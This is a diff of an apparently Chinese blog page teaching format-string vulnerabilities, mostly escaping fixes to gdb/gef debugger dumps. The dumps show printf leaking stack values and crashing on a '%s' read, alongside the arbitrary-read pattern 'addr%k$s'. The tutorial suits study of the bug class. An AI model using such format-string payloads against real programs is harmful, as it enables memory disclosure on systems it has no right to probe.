@@ -306,7 +306,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '686f746a95b6f836d7d70567c302c3f9ebb5ee0def3d1220ee9d4e9f34f5e131';
+        let pwd = '';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -475,14 +475,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    13.2k
+                    12.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    60 分
+                    56 分
                 </div>
                 
 				
@@ -686,7 +686,7 @@ addr of format string: Color %s...</code></pre><p>在进入printf之后，函数
 </li>
 </ul>
 <h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>例如，给定如下程序</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
@@ -742,7 +742,7 @@ $esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20
 $ebp   : 0xffffd078  →  0x00000000
 $esi   : 0xf7fb6000  →  0x001b1db0
 $edi   : 0xf7fb6000  →  0x001b1db0
-$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -758,13 +758,13 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7e4d66d                  nop    
    0xf7e4d66e                  xchg   ax, ax
- → 0xf7e4d670 <printf+0>       call   0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7f23b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7f23b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7f23b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7f23b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7f23b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7f23b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
@@ -772,7 +772,7 @@ __x86.get_pc_thunk.ax (
 [#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
 ───────────────────────────────────────────────────────────────────── trace ────
 [#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")
-[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></printf+0></fprintf+23></main+98></printf+0></main+98></code></pre>
+[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看出，此时已经进入了printf函数中，<strong>栈中的第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。</strong>继续运行程序。</p>
 <pre class="line-numbers language-shell"><code class="language-shell">gef➤  c
 Continuing.
@@ -790,7 +790,7 @@ $esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10
 $ebp   : 0xffffd078  →  0x00000000
 $esi   : 0xf7fb6000  →  0x001b1db0
 $edi   : 0xf7fb6000  →  0x001b1db0
-$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -806,13 +806,13 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7e4d66d                  nop    
    0xf7e4d66e                  xchg   ax, ax
- → 0xf7e4d670 <printf+0>       call   0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7f23b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7f23b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7f23b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7f23b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7f23b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7f23b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
@@ -820,7 +820,7 @@ __x86.get_pc_thunk.ax (
 [#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
 ───────────────────────────────────────────────────────────────────── trace ────
 [#0] 0xf7e4d670 → __printf(format=0xffffd008 "%08x.%08x.%08x")
-[#1] 0x804852c → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></printf+0></fprintf+23></main+113></printf+0></main+113></code></pre>
+[#1] 0x804852c → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>此时，由于格式化字符串为%x%x%x，所以，程序会将栈上的第三个地址开始处(也就是0xffffcfe4)及其以后的数值分别作为第一、第二、第三个参数按照int型进行解析，分别输出。继续运行，我们可以得到如下结果，和想象中一致。</p>
 <pre class="line-numbers language-shell"><code class="language-shell">gef➤  c
 Continuing.
@@ -854,7 +854,7 @@ $esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20
 $ebp   : 0xffffd078  →  0x00000000
 $esi   : 0xf7fb6000  →  0x001b1db0
 $edi   : 0xf7fb6000  →  0x001b1db0
-$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -870,13 +870,13 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7e4d66d                  nop    
    0xf7e4d66e                  xchg   ax, ax
- → 0xf7e4d670 <printf+0>       call   0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7f23b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7f23b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7f23b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7f23b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7f23b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7f23b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
@@ -902,7 +902,7 @@ $esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10
 $ebp   : 0xffffd078  →  0x00000000
 $esi   : 0xf7fb6000  →  0x001b1db0
 $edi   : 0xf7fb6000  →  0x001b1db0
-$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -918,13 +918,13 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7e4d66d                  nop    
    0xf7e4d66e                  xchg   ax, ax
- → 0xf7e4d670 <printf+0>       call   0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7f23b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7f23b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7f23b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7f23b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7f23b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7f23b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
@@ -936,7 +936,7 @@ __x86.get_pc_thunk.ax (
 
 gef➤  c
 Continuing.
-f0b5ff[Inferior 1 (process 4290) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></printf+0></fprintf+23></main+113></printf+0></main+113></printf+0></fprintf+23></main+98></printf+0></main+98></code></pre>
+f0b5ff[Inferior 1 (process 4290) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>栈上第一个值是返回地址，第二个值是格式化字符串地址，第三个是格式化字符串第一个参数，第四个是格式化字符串第二个参数，第五个是格式化字符串第三个参数，也就是我们要输出的0x00f0b5ff。<strong>注意，格式化字符串的第三个参数是printf函数输出的第四个参数。</strong></p>
 <h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下</p>
 <pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemory
@@ -958,7 +958,7 @@ $esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20
 $ebp   : 0xffffd078  →  0x00000000
 $esi   : 0xf7fb6000  →  0x001b1db0
 $edi   : 0xf7fb6000  →  0x001b1db0
-$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -974,13 +974,13 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7e4d66d                  nop    
    0xf7e4d66e                  xchg   ax, ax
- → 0xf7e4d670 <printf+0>       call   0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7f23b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7f23b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7f23b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7f23b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7f23b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7f23b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
@@ -1006,7 +1006,7 @@ $esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10
 $ebp   : 0xffffd078  →  0x00000000
 $esi   : 0xf7fb6000  →  0x001b1db0
 $edi   : 0xf7fb6000  →  0x001b1db0
-$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -1022,13 +1022,13 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7e4d66d                  nop    
    0xf7e4d66e                  xchg   ax, ax
- → 0xf7e4d670 <printf+0>       call   0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7f23b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7f23b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7f23b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7f23b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7f23b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7f23b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
@@ -1040,7 +1040,7 @@ __x86.get_pc_thunk.ax (
 
 gef➤  c
 Continuing.
-%s[Inferior 1 (process 4344) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></printf+0></fprintf+23></main+113></printf+0></main+113></printf+0></fprintf+23></main+98></printf+0></main+98></code></pre>
+%s[Inferior 1 (process 4344) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看出，在第二次执行printf函数的时候，确实将0xffffcfe4处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p>
 <p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p>
 <p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 4 个参数，如下，此时程序就不能够解析，就崩溃了。</p>
@@ -1071,7 +1071,7 @@ $esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10
 $ebp   : 0xffffd078  →  0x00000000
 $esi   : 0xf7fb6000  →  0x001b1db0
 $edi   : 0xf7fb6000  →  0x001b1db0
-$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -1082,7 +1082,7 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
 0xffffcfec│+0x0010: 0x00f0b5ff
 0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x00000000
 0xffffcff4│+0x0018: 0x00000001
-0xffffcff8│+0x001c: 0x000000c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></main+113></printf+0></main+113></code></pre>
+0xffffcff8│+0x001c: 0x000000c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以看出在栈上的第二个变量就是我们的格式化字符串地址0xffffd008,同时该地址存储的也确实是”%s”格式化字符串内容。</p>
 <p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p>
 <pre><code>addr%k$s</code></pre><blockquote>
@@ -1118,7 +1118,7 @@ $esp   : 0xffffc4ec  →  0xf7e45977  →  <printf_positional+7575> add esp, 0x1
 $ebp   : 0xffffca98  →  0xffffcfb8  →  0xffffd078  →  0x00000000
 $esi   : 0xffffc680  →  0xffffffff
 $edi   : 0xf7fb6d60  →  0xfbad2a84
-$eip   : 0xf7e795cf  →  &lt;__strlen_ia32+15&gt; cmp BYTE PTR [eax], dh
+$eip   : 0xf7e795cf  →  <__strlen_ia32+15> cmp BYTE PTR [eax], dh
 $eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -1131,21 +1131,21 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
 0xffffc504│+0x0018: 0x00000000
 0xffffc508│+0x001c: 0x00000000
 ─────────────────────────────────────────────────────────────── code:x86:32 ────
-   0xf7e795c8 &lt;__strlen_ia32+8&gt; add    BYTE PTR [ecx], ah
-   0xf7e795ca &lt;__strlen_ia32+10&gt; ret    0x2474
-   0xf7e795cd &lt;__strlen_ia32+13&gt; jp     0xf7e795e6 &lt;__strlen_ia32+38&gt;
- → 0xf7e795cf &lt;__strlen_ia32+15&gt; cmp    BYTE PTR [eax], dh
-   0xf7e795d1 &lt;__strlen_ia32+17&gt; je     0xf7e79676 &lt;__strlen_ia32+182&gt;
-   0xf7e795d7 &lt;__strlen_ia32+23&gt; inc    eax
-   0xf7e795d8 &lt;__strlen_ia32+24&gt; cmp    BYTE PTR [eax], dh
-   0xf7e795da &lt;__strlen_ia32+26&gt; je     0xf7e79676 &lt;__strlen_ia32+182&gt;
-   0xf7e795e0 &lt;__strlen_ia32+32&gt; inc    eax
+   0xf7e795c8 <__strlen_ia32+8> add    BYTE PTR [ecx], ah
+   0xf7e795ca <__strlen_ia32+10> ret    0x2474
+   0xf7e795cd <__strlen_ia32+13> jp     0xf7e795e6 <__strlen_ia32+38>
+ → 0xf7e795cf <__strlen_ia32+15> cmp    BYTE PTR [eax], dh
+   0xf7e795d1 <__strlen_ia32+17> je     0xf7e79676 <__strlen_ia32+182>
+   0xf7e795d7 <__strlen_ia32+23> inc    eax
+   0xf7e795d8 <__strlen_ia32+24> cmp    BYTE PTR [eax], dh
+   0xf7e795da <__strlen_ia32+26> je     0xf7e79676 <__strlen_ia32+182>
+   0xf7e795e0 <__strlen_ia32+32> inc    eax
 ─────────────────────────────────────────────────────────────────── threads ────
 [#0] Id 1, Name: "leakmemory", stopped 0xf7e795cf in __strlen_ia32 (), reason: SIGSEGV
 ───────────────────────────────────────────────────────────────────── trace ────
 [#0] 0xf7e795cf → __strlen_ia32()
